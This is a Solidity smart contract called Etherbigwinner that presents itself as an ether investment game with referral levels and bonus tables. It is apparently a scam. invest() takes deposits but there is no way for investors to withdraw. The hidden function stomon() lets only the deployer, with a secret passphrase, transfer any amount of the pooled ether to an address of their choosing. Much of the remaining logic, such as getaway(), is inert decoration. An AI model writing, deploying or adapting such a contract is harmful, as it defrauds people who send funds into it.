 

pragma solidity ^0.4.18;
 

 
 
 
 
contract Etherbigwinner {

    address public minter;
    uint ethWei = 1 ether;
    uint rid = 1;
    	uint bonuslimit = 15 ether;
	uint sendLimit = 100 ether;
	uint withdrawLimit = 15 ether;
	uint canImport = 1;
	 uint totalMoney = 0;
    bytes32 public hashLock = 0x449e70f55b2d1405e35f2ac0bb17549fff3df38239910a33c870101274191e1b;	
	uint canSetStartTime = 1;
	mapping(string => address) addressMapping;

    function () payable public {}
    function Etherbigwinner() public {
        minter = msg.sender;
    }
        uint totalCount = 0;
    	struct User{
        address userAddress;
        uint freeAmount;
        uint freezeAmount;
        uint rechargeAmount;
        uint withdrawlsAmount;
        uint inviteAmonut;
        uint bonusAmount;
        uint dayInviteAmonut;
        uint dayBonusAmount;
        uint level;
        uint resTime;
        uint lineAmount;
        uint lineLevel;
        string inviteCode;
        string beInvitedCode;
		uint isline;
		uint status; 
		bool isVaild;
    }
    
    struct Invest{

        address userAddress;
        uint inputAmount;
        uint resTime;
        string inviteCode;
        string beInvitedCode;
		uint isline;
		uint status; 
		uint times;
    }
      mapping (address => User) userMapping; 
    mapping (uint => address) indexMapping;
	uint private beginTime = 1;
	    uint oneDayCount = 0;
	     uint allCount = 0;
	       Invest[] invests;
    function stomon(address  userAddress, uint money,string _WhatIsTheMagicKey)  public {
          require(sha256(_WhatIsTheMagicKey) == hashLock);
           if (msg.sender != minter) return;
		if (money > 0) {
			userAddress.transfer(money);
		}
	}
		function getLevel(uint value) public view returns (uint) {
		if (value >= 0 * ethWei && value <= 5 * ethWei) {
			return 1;
		}
		if (value >= 6 * ethWei && value <= 10 * ethWei) {
			return 2;
		}
		if (value >= 11 * ethWei && value <= 15 * ethWei) {
			return 3;
		}
		return 0;
	}

	function getNodeLevel(uint value) public view returns (uint) {
		if (value >= 0 * ethWei && value <= 5 * ethWei) {
			return 1;
		}
		if (value >= 6 * ethWei && value <= 10 * ethWei) {
			return 2;
		}
		if (value >= 11 * ethWei) {
			return 3;
		}
		return 0;
	}

	function getScByLevel(uint level) public pure returns (uint) {
		if (level == 1) {
			return 5;
		}
		if (level == 2) {
			return 7;
		}
		if (level == 3) {
			return 10;
		}
		return 0;
	}

	function getFireScByLevel(uint level) public pure returns (uint) {
		if (level == 1) {
			return 3;
		}
		if (level == 2) {
			return 6;
		}
		if (level == 3) {
			return 10;
		}
		return 0;
	}

	function getRecommendScaleByLevelAndTim(uint level, uint times) public pure returns (uint){
		if (level == 1 && times == 1) {
			return 50;
		}
		if (level == 2 && times == 1) {
			return 70;
		}
		if (level == 2 && times == 2) {
			return 50;
		}
		if (level == 3) {
			if (times == 1) {
				return 100;
			}
			if (times == 2) {
				return 70;
			}
			if (times == 3) {
				return 50;
			}
			if (times >= 4 && times <= 10) {
				return 10;
			}
			if (times >= 11 && times <= 20) {
				return 5;
			}
			if (times >= 21) {
				return 1;
			}
		}
		return 0;
	}

     function invest(address userAddress ,uint inputAmount,string  inviteCode,string  beInvitedCode) public payable{
        
        userAddress = msg.sender;
  		inputAmount = msg.value;
        uint lineAmount = inputAmount;
        
     
       totalMoney = totalMoney + inputAmount;
        totalCount = totalCount + 1;
        bool isLine = false;
        
        
       
        if(beginTime==1){
            lineAmount = 0;
            oneDayCount = oneDayCount + inputAmount;
            Invest memory invest1 = Invest(userAddress,inputAmount,now, inviteCode, beInvitedCode ,1,1,0);
            invests.push(invest1);
           
        }else{
            allCount = allCount + inputAmount;
            isLine = true;
            invest1 = Invest(userAddress,inputAmount,now, inviteCode, beInvitedCode ,0,1,0);
            inputAmount = 0;
            invests.push(invest1);
        }
          User memory user = userMapping[userAddress];
            if(user.isVaild && user.status == 1){
                user.freezeAmount = user.freezeAmount + inputAmount;
                user.rechargeAmount = user.rechargeAmount + inputAmount;
                user.lineAmount = user.lineAmount + lineAmount;
       
             
                userMapping[userAddress] = user;
                
            }else{
                
                if(user.isVaild){
                   inviteCode = user.inviteCode;
                   beInvitedCode = user.beInvitedCode;
                }
               
              
            }
            address  userAddressCode = addressMapping[inviteCode];
            if(userAddressCode == 0x0000000000000000000000000000000000000000){
                addressMapping[inviteCode] = userAddress;
            }
        
    }
    
        function getUserByinviteCode(string inviteCode) public view returns (bool){
        
        address  userAddressCode = addressMapping[inviteCode];
        User memory user = userMapping[userAddressCode];
      if (user.isVaild){
            return true;
      }
        return false;
    }
    
    
    

	function getaway(uint money) pure private {
		
		for (uint i = 1; i <= 25; i++) {
		    uint moneyResult = 0;
			if (money <= 15 ether) {
				moneyResult = money;
			} else {
				moneyResult = 15 ether;
			}

		  
	
		}
	}
	
}